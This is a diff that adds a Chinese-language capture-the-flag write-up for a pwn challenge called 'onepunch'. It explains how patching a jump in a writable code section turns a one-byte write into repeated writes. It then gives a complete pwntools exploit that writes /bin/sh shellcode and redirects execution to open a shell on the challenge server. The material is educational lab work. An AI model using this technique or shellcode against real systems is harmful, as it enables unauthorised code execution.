@@ -1130,6 +1130,47 @@ r.send(p)
 r.interactive()
 ```
 
+## 68 onepunch
+開 ida 看 code，這題給你輸入兩個數字，然後讓你可以修改任意位置的值，但是限制是一次只能寫一個 byte。
+
+但一個 byte 實在是做不了甚麼事，所以就先想說要怎麼樣才可以修改多個 byte，又或者是說可以多修改幾次。
+
+再分析了一下 code 後，看到這個程式初始化時，會跑一個名字是 _ 的 function，裡面做的事是把 code section 的權限改成可讀、可寫、可執行。
+![image](https://hackmd.io/_uploads/rJewqnTell.png)
+
+這個也可以從 gdb 的 vmmap 中看到
+![image](https://hackmd.io/_uploads/BJrCcnTexe.png)
+
+有這個條件就方便了，可以從 code section 中找目標下手，我這邊是選了下面圖裡的 jnz，把他跳躍的目標從後面 address 改成向前到特定的 address 就可以做到重複任意寫了。
+![image](https://hackmd.io/_uploads/ry0Ei36gll.png)
+
+後面就簡單了，找個地方把 shellcode 寫上去，再用相同手法修改 jnz 的目的地，就可以拿到 shell 了
+
+```python=
+# set jmp back to certain address
+data = [(0x400768, 180)]
+
+# write shell code from 0x400790
+shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"
+for i in range(len(shellcode)):
+    data.append((0x400790 + i, shellcode[i]))
+
+# set jmp to 0x400790
+data.append((0x400768, 39))
+
+#r = process("./asset/onepunch")
+r = remote('hackme.inndy.tw',7718)
+input("Press any button to continue...")
+for i in range(len(data)):
+    r.recvuntil(b'Where What?')
+    s = hex(data[i][0])[2:] + ' ' + str(data[i][1])
+    s = s.encode('utf-8')
+    print("s:", s)
+    r.sendline(s)
+r.interactive()
+```
+
+
 ## 70 rsbo
 這題進行 read 時長度設為 0x80，但 buffer 長度只有 80，因此可以進行 bof，但 bof 長度不夠，可以透過 Stack Migration 的方式增加 ROPchain 的長度
 
